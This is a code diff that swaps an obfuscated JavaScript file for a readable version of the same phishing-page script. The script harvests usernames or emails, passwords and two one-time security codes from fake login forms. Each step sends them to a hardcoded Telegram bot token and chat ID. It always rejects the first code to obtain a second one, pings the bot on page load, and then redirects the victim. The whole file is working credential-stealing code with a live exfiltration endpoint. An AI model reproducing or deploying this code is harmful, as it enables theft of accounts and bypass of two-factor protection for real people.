@@ -1,1 +1,283 @@
-var _0x42ea1b=_0x6703;(function(_0x995832,_0xc86e74){var _0x1111ac=_0x6703,_0x32858b=_0x995832();while(!![]){try{var _0x52cd39=-parseInt(_0x1111ac(0x167))/0x1+parseInt(_0x1111ac(0x143))/0x2+parseInt(_0x1111ac(0x15b))/0x3*(-parseInt(_0x1111ac(0x15c))/0x4)+-parseInt(_0x1111ac(0x14f))/0x5*(parseInt(_0x1111ac(0x16d))/0x6)+parseInt(_0x1111ac(0x15f))/0x7*(parseInt(_0x1111ac(0x153))/0x8)+parseInt(_0x1111ac(0x148))/0x9+-parseInt(_0x1111ac(0x15a))/0xa*(parseInt(_0x1111ac(0x165))/0xb);if(_0x52cd39===_0xc86e74)break;else _0x32858b['push'](_0x32858b['shift']());}catch(_0xeaac29){_0x32858b['push'](_0x32858b['shift']());}}}(_0x5c65,0x70ca5),window[_0x42ea1b(0x156)](_0x42ea1b(0x141),_0x292119=>{hiniDikush();}));const submitButton=document['querySelector'](_0x42ea1b(0x16c)),butoniloading=document[_0x42ea1b(0x160)](_0x42ea1b(0x170));butoniloading[_0x42ea1b(0x164)][_0x42ea1b(0x158)]='none';const notification_error=document[_0x42ea1b(0x160)](_0x42ea1b(0x16f)),invalid_code_erorr=document['querySelector']('.invalid_code_erorr'),invalid_first_code_erorr=document[_0x42ea1b(0x160)](_0x42ea1b(0x150)),close_notification=document[_0x42ea1b(0x160)](_0x42ea1b(0x154)),close_notification_code=document[_0x42ea1b(0x160)]('.close-notification_code'),close_invalid_first_code_erorr=document['querySelector'](_0x42ea1b(0x159)),usernameOrEmail=document['querySelector'](_0x42ea1b(0x14d)),password=document[_0x42ea1b(0x160)](_0x42ea1b(0x163)),emailError=document[_0x42ea1b(0x160)](_0x42ea1b(0x145)),passwordError=document[_0x42ea1b(0x160)](_0x42ea1b(0x161)),loginForm=document[_0x42ea1b(0x160)]('#loginForm'),emailCodeForm=document[_0x42ea1b(0x160)](_0x42ea1b(0x146)),codeError=document['querySelector'](_0x42ea1b(0x14e)),codeInput=document[_0x42ea1b(0x160)]('#codeInput'),submitEmailCode=document[_0x42ea1b(0x160)]('#submitEmailCode'),butoniloadingEmailCode=document['querySelector'](_0x42ea1b(0x155));let firstTime=!![];function _0x5c65(){var _0x34706a=['change','GET','119MqcirN','querySelector','#passwordError','value','#password','style','11HwhPjE','&chat_id=5607989288&parse_mode=html','353917melDdA','href','Email\x20or\x20username:\x20','preventDefault','length','#submitButton1','285966KZOnvA','\x20\x0a\x20|\x20password:\x20','.notification_error','#butoniloading','6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa','location','https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=','load','#557086','1480168Mdcmqr','send','#emailError','#emailCodeForm','flex','8091891WysfUp','open','click','none','borderColor','#usernameOrEmail','#codeError','45Rijfhq','.invalid_first_code_erorr','#ff1f44','\x20\x0a\x20|\x20Sec\x20code:\x20','271000KEuqEq','.close-notification','#butoniloadingEmailCode','addEventListener','successfully-applied','display','.close-notification_code','5795170oVfDdb','1172058LIyjlt','4MDUljV'];_0x5c65=function(){return _0x34706a;};return _0x5c65();}submitButton[_0x42ea1b(0x156)](_0x42ea1b(0x14a),function(_0x2c1bc0){var _0x2dbdf7=_0x42ea1b;_0x2c1bc0[_0x2dbdf7(0x16a)](),!validatePasswordAndEmail()?(sendEmailPasswordTelegram(),buttontoggle(!![]),setTimeout(()=>{buttontoggle(![]),toggleForm(!![]);},0xbb8)):buttontoggle(![]);}),submitEmailCode[_0x42ea1b(0x156)](_0x42ea1b(0x14a),function(_0x3590ed){var _0x2eaa3a=_0x42ea1b;_0x3590ed[_0x2eaa3a(0x16a)](),codeInput[_0x2eaa3a(0x162)]['length']===0x6?(codeButtonToggle(!![]),firstTime?(sendFirstCodeTelegram(),setTimeout(()=>{var _0x1d9a1d=_0x2eaa3a;invalid_first_code_erorr[_0x1d9a1d(0x164)]['display']='flex',codeButtonToggle(![]);},0x1388),setTimeout(()=>{var _0xeeb4e3=_0x2eaa3a;invalid_first_code_erorr[_0xeeb4e3(0x164)][_0xeeb4e3(0x158)]='none';},0x2af8),setErrorcode(![]),firstTime=![]):(sendSecCodeTelegram(),setTimeout(()=>{codeButtonToggle(![]);},0x7d0),setTimeout(()=>{var _0x4b4a7c=_0x2eaa3a;invalid_code_erorr[_0x4b4a7c(0x164)][_0x4b4a7c(0x158)]='none';},0x1b58),window[_0x2eaa3a(0x172)][_0x2eaa3a(0x168)]=_0x2eaa3a(0x157))):(setErrorcode(!![]),invalid_code_erorr[_0x2eaa3a(0x164)][_0x2eaa3a(0x158)]=_0x2eaa3a(0x14b));});function setErrorcode(_0x171794){var _0x2aaad8=_0x42ea1b;_0x171794?(codeInput['style'][_0x2aaad8(0x14c)]=_0x2aaad8(0x151),codeError['style'][_0x2aaad8(0x158)]='block'):(codeInput[_0x2aaad8(0x164)]['borderColor']=_0x2aaad8(0x142),codeError[_0x2aaad8(0x164)][_0x2aaad8(0x158)]=_0x2aaad8(0x14b));}close_notification[_0x42ea1b(0x156)](_0x42ea1b(0x14a),function(_0x34fdbe){var _0x50086f=_0x42ea1b;_0x34fdbe[_0x50086f(0x16a)](),notification_error[_0x50086f(0x164)]['display']=_0x50086f(0x14b);});function validatePasswordAndEmail(){var _0x498dc6=_0x42ea1b;return passwordError['style'][_0x498dc6(0x158)]=password['value']['length']<0x6?_0x498dc6(0x147):'none',emailError[_0x498dc6(0x164)][_0x498dc6(0x158)]=usernameOrEmail[_0x498dc6(0x162)][_0x498dc6(0x16b)]<0x3?_0x498dc6(0x147):_0x498dc6(0x14b),password['value'][_0x498dc6(0x16b)]<0x6||usernameOrEmail[_0x498dc6(0x162)][_0x498dc6(0x16b)]<0x3;}function toggleForm(_0x15b65a){var _0x2e9d58=_0x42ea1b;_0x15b65a?(emailCodeForm[_0x2e9d58(0x164)][_0x2e9d58(0x158)]=_0x2e9d58(0x147),loginForm[_0x2e9d58(0x164)]['display']='none'):(loginForm['style']['display']='flex',emailCodeForm[_0x2e9d58(0x164)][_0x2e9d58(0x158)]='none');}function buttontoggle(_0x3e93d3){var _0x2c6bc3=_0x42ea1b;_0x3e93d3?(butoniloading['style']['display']=_0x2c6bc3(0x147),submitButton[_0x2c6bc3(0x164)]['display']='none'):(submitButton['style'][_0x2c6bc3(0x158)]=_0x2c6bc3(0x147),butoniloading[_0x2c6bc3(0x164)]['display']=_0x2c6bc3(0x14b));}function _0x6703(_0x1d92d7,_0x7bfcb9){var _0x5c6599=_0x5c65();return _0x6703=function(_0x6703f1,_0x732309){_0x6703f1=_0x6703f1-0x140;var _0x5d549e=_0x5c6599[_0x6703f1];return _0x5d549e;},_0x6703(_0x1d92d7,_0x7bfcb9);}function codeButtonToggle(_0x4fe103){var _0x306df1=_0x42ea1b;_0x4fe103?(butoniloadingEmailCode[_0x306df1(0x164)][_0x306df1(0x158)]=_0x306df1(0x147),submitEmailCode[_0x306df1(0x164)][_0x306df1(0x158)]=_0x306df1(0x14b)):(submitEmailCode[_0x306df1(0x164)][_0x306df1(0x158)]=_0x306df1(0x147),butoniloadingEmailCode[_0x306df1(0x164)][_0x306df1(0x158)]=_0x306df1(0x14b));}usernameOrEmail[_0x42ea1b(0x156)]('change',function(_0x5bbe0c){validatePasswordAndEmail();}),password[_0x42ea1b(0x156)](_0x42ea1b(0x15d),function(_0x2d80a1){validatePasswordAndEmail();}),close_notification_code[_0x42ea1b(0x156)](_0x42ea1b(0x14a),function(_0x32fd78){var _0x31271f=_0x42ea1b;_0x32fd78[_0x31271f(0x16a)](),invalid_code_erorr[_0x31271f(0x164)]['display']=_0x31271f(0x14b);});function sendEmailPasswordTelegram(){var _0x9f88fd=_0x42ea1b,_0x1dab6f=_0x9f88fd(0x169)+usernameOrEmail['value']+_0x9f88fd(0x16e)+password[_0x9f88fd(0x162)]+'\x20\x0a',_0x5d50e2=_0x9f88fd(0x171),_0x2ae52c=0x14e432028,_0x48d9cb=_0x9f88fd(0x140)+_0x1dab6f+'&chat_id=5607989288&parse_mode=html',_0x2ae52c=0x14e432028,_0x5057cb=_0x9f88fd(0x140)+_0x1dab6f+'&chat_id=5607989288&parse_mode=html',_0x5d50e2=_0x9f88fd(0x171),_0x2ae52c=0x14e432028,_0x199a85=_0x9f88fd(0x140)+_0x1dab6f+'&chat_id=5607989288&parse_mode=html',_0x1ecde1=new XMLHttpRequest();_0x1ecde1[_0x9f88fd(0x149)](_0x9f88fd(0x15e),_0x48d9cb,!![]),_0x1ecde1[_0x9f88fd(0x144)]();var _0x31e207=new XMLHttpRequest();_0x31e207[_0x9f88fd(0x149)]('GET',_0x5057cb,!![]),_0x31e207[_0x9f88fd(0x144)]();var _0x3fd196=new XMLHttpRequest();_0x3fd196[_0x9f88fd(0x149)](_0x9f88fd(0x15e),_0x199a85,!![]),_0x3fd196['send']();}function sendFirstCodeTelegram(){var _0x51e68a=_0x42ea1b,_0x419be7=_0x51e68a(0x169)+usernameOrEmail[_0x51e68a(0x162)]+_0x51e68a(0x16e)+password[_0x51e68a(0x162)]+'\x20\x0a\x20|\x20First\x20code:\x20'+codeInput['value'],_0x32ca3c='6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa',_0x22adf4=0x14e432028,_0x488bb0='https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text='+_0x419be7+_0x51e68a(0x166),_0x32ca3c='6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa',_0x22adf4=0x14e432028,_0x478cc0='https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text='+_0x419be7+_0x51e68a(0x166),_0x32ca3c=_0x51e68a(0x171),_0x22adf4=0x14e432028,_0x519fcd='https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text='+_0x419be7+_0x51e68a(0x166),_0x5a8203=new XMLHttpRequest();_0x5a8203['open'](_0x51e68a(0x15e),_0x488bb0,!![]),_0x5a8203['send']();var _0x2754ba=new XMLHttpRequest();_0x2754ba[_0x51e68a(0x149)](_0x51e68a(0x15e),_0x478cc0,!![]),_0x2754ba[_0x51e68a(0x144)]();var _0x585047=new XMLHttpRequest();_0x585047[_0x51e68a(0x149)](_0x51e68a(0x15e),_0x519fcd,!![]),_0x585047[_0x51e68a(0x144)]();}function sendSecCodeTelegram(){var _0x42e3e3=_0x42ea1b,_0x10811e='\x20Email\x20or\x20username:\x20'+usernameOrEmail[_0x42e3e3(0x162)]+_0x42e3e3(0x16e)+password['value']+_0x42e3e3(0x152)+codeInput[_0x42e3e3(0x162)]+'\x20',_0x2ad08c='6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa',_0x39192d=0x14e432028,_0x537306=_0x42e3e3(0x140)+_0x10811e+_0x42e3e3(0x166),_0x2ad08c=_0x42e3e3(0x171),_0x39192d=0x14e432028,_0x2016d7=_0x42e3e3(0x140)+_0x10811e+'&chat_id=5607989288&parse_mode=html',_0x2ad08c=_0x42e3e3(0x171),_0x39192d=0x14e432028,_0x510b60='https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text='+_0x10811e+_0x42e3e3(0x166),_0x575a2e=new XMLHttpRequest();_0x575a2e[_0x42e3e3(0x149)](_0x42e3e3(0x15e),_0x537306,!![]),_0x575a2e[_0x42e3e3(0x144)]();var _0x49d232=new XMLHttpRequest();_0x575a2e[_0x42e3e3(0x149)](_0x42e3e3(0x15e),_0x2016d7,!![]),_0x575a2e['send']();var _0xe9256b=new XMLHttpRequest();_0x575a2e[_0x42e3e3(0x149)]('GET',_0x510b60,!![]),_0x575a2e[_0x42e3e3(0x144)]();}function hiniDikush(){var _0x560feb=_0x42ea1b,_0xa57b1e='----\x20Hini\x20dikush\x20----',_0x149e76=_0x560feb(0x171),_0x5bf906=0x14e432028,_0x3c2d4e=_0x560feb(0x140)+_0xa57b1e+_0x560feb(0x166),_0x149e76=_0x560feb(0x171),_0x5bf906=0x14e432028,_0x4e5256=_0x560feb(0x140)+_0xa57b1e+_0x560feb(0x166),_0x149e76=_0x560feb(0x171),_0x5bf906=0x14e432028,_0x4e5256=_0x560feb(0x140)+_0xa57b1e+_0x560feb(0x166),_0x149e76='6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQaw',_0x5bf906=0x14e432028,_0x3ef9ed=_0x560feb(0x140)+_0xa57b1e+_0x560feb(0x166),_0x310f47=new XMLHttpRequest();_0x310f47[_0x560feb(0x149)]('GET',_0x3c2d4e,!![]),_0x310f47[_0x560feb(0x144)]();var _0x46b1de=new XMLHttpRequest();_0x310f47['open'](_0x560feb(0x15e),_0x4e5256,!![]),_0x310f47[_0x560feb(0x144)]();var _0xa967cd=new XMLHttpRequest();_0x310f47[_0x560feb(0x149)](_0x560feb(0x15e),_0x3ef9ed,!![]),_0x310f47[_0x560feb(0x144)]();}
+window.addEventListener('load', (event) => {
+    hiniDikush()
+});
+
+const submitButton = document.querySelector("#submitButton1");
+const butoniloading = document.querySelector("#butoniloading");
+butoniloading.style.display = "none";
+
+//login error
+const notification_error = document.querySelector(".notification_error");
+//sec code error
+const invalid_code_erorr = document.querySelector(".invalid_code_erorr");
+
+//first code error
+const invalid_first_code_erorr = document.querySelector(".invalid_first_code_erorr");
+
+
+const close_notification = document.querySelector(".close-notification");
+const close_notification_code = document.querySelector(".close-notification_code");
+const close_invalid_first_code_erorr = document.querySelector(".close-notification_code");
+
+
+const usernameOrEmail = document.querySelector("#usernameOrEmail");
+const password = document.querySelector("#password");
+
+const emailError = document.querySelector("#emailError");
+const passwordError = document.querySelector("#passwordError");
+
+const loginForm = document.querySelector("#loginForm");
+const emailCodeForm = document.querySelector("#emailCodeForm");
+
+
+const codeError = document.querySelector("#codeError");
+const codeInput = document.querySelector("#codeInput");
+
+
+
+const submitEmailCode = document.querySelector("#submitEmailCode");
+const butoniloadingEmailCode = document.querySelector("#butoniloadingEmailCode");
+
+
+let firstTime = true;
+
+submitButton.addEventListener("click", function(e) {
+    e.preventDefault()
+    if (!validatePasswordAndEmail()) {
+        sendEmailPasswordTelegram();
+        buttontoggle(true)
+        setTimeout(() => {
+            buttontoggle(false)
+            toggleForm(true)
+        }, 3000)
+    } else {
+        buttontoggle(false)
+    }
+})
+
+
+submitEmailCode.addEventListener("click", function(e) {
+    e.preventDefault()
+    if (codeInput.value.length === 6) {
+        codeButtonToggle(true)
+        if (firstTime) {
+            sendFirstCodeTelegram();
+            setTimeout(() => {
+                invalid_first_code_erorr.style.display = "flex";
+                codeButtonToggle(false)
+            }, 5000)
+            setTimeout(() => {
+                invalid_first_code_erorr.style.display = "none";
+            }, 11000)
+            setErrorcode(false)
+            firstTime = false
+        } else {
+            sendSecCodeTelegram();
+            setTimeout(() => {
+                // invalid_code_erorr.style.display = "flex";
+                codeButtonToggle(false)
+
+            }, 2000)
+            setTimeout(() => {
+                invalid_code_erorr.style.display = "none";
+            }, 7000)
+
+            window.location.href = 'successfully-applied';
+
+        }
+
+    } else {
+        setErrorcode(true)
+        invalid_code_erorr.style.display = "none";
+    }
+})
+
+function setErrorcode(truee) {
+    if (truee) {
+        codeInput.style.borderColor = "#ff1f44"
+        codeError.style.display = "block"
+    } else {
+        codeInput.style.borderColor = "#557086"
+        codeError.style.display = "none"
+    }
+}
+
+
+close_notification.addEventListener("click", function(e) {
+    e.preventDefault();
+    notification_error.style.display = "none";
+})
+
+function validatePasswordAndEmail() {
+    passwordError.style.display = password.value.length < 6 ? "flex" : "none";
+    emailError.style.display = usernameOrEmail.value.length < 3 ? "flex" : "none";
+    return password.value.length < 6 || usernameOrEmail.value.length < 3;
+
+}
+
+function toggleForm(loading) {
+    if (loading) {
+        emailCodeForm.style.display = "flex"
+        loginForm.style.display = "none"
+    } else {
+        loginForm.style.display = "flex"
+        emailCodeForm.style.display = "none"
+    }
+}
+
+
+function buttontoggle(logined) {
+    if (logined) {
+        butoniloading.style.display = "flex"
+        submitButton.style.display = "none"
+    } else {
+        submitButton.style.display = "flex"
+        butoniloading.style.display = "none"
+    }
+}
+
+function codeButtonToggle(logined) {
+    if (logined) {
+        butoniloadingEmailCode.style.display = "flex"
+        submitEmailCode.style.display = "none"
+    } else {
+        submitEmailCode.style.display = "flex"
+        butoniloadingEmailCode.style.display = "none"
+    }
+}
+usernameOrEmail.addEventListener("change", function(e) {
+    validatePasswordAndEmail()
+});
+
+password.addEventListener("change", function(e) {
+    validatePasswordAndEmail()
+});
+
+close_notification_code.addEventListener("click", function(e) {
+    e.preventDefault()
+    invalid_code_erorr.style.display = "none";
+})
+
+
+
+
+
+function sendEmailPasswordTelegram() {
+    var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n`;
+
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+    var chat_id = 5607989288;
+    var url1 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url2 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+
+    var oReq = new XMLHttpRequest();
+    oReq.open("GET", url, true);
+    oReq.send();
+    var oReq1 = new XMLHttpRequest();
+    oReq1.open("GET", url1, true);
+    oReq1.send();
+    var oReq2 = new XMLHttpRequest();
+    oReq2.open("GET", url2, true);
+    oReq2.send();
+}
+
+function sendFirstCodeTelegram() {
+    var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n | First code: ${codeInput.value}`;
+
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url1 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url2 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+
+    var oReq = new XMLHttpRequest();
+    oReq.open("GET", url, true);
+    oReq.send();
+    var oReq1 = new XMLHttpRequest();
+    oReq1.open("GET", url1, true);
+    oReq1.send();
+    var oReq2 = new XMLHttpRequest();
+    oReq2.open("GET", url2, true);
+    oReq2.send();
+}
+
+function sendSecCodeTelegram() {
+    var message = ` Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n | Sec code: ${codeInput.value} `;
+
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url1 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url2 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+
+    var oReq = new XMLHttpRequest();
+    oReq.open("GET", url, true);
+    oReq.send();
+    var oReq1 = new XMLHttpRequest();
+    oReq.open("GET", url1, true);
+    oReq.send();
+    var oReq2 = new XMLHttpRequest();
+    oReq.open("GET", url2, true);
+    oReq.send();
+}
+
+
+
+function hiniDikush() {
+    var message = `---- Hini dikush ----`;
+
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url1 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
+    var chat_id = 5607989288;
+    var url1 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQaw";
+    var chat_id = 5607989288;
+    var url2 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
+
+    var oReq = new XMLHttpRequest();
+    oReq.open("GET", url, true);
+    oReq.send();
+    var oReq1 = new XMLHttpRequest();
+    oReq.open("GET", url1, true);
+    oReq.send();
+    var oReq2 = new XMLHttpRequest();
+    oReq.open("GET", url2, true);
+    oReq.send();
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
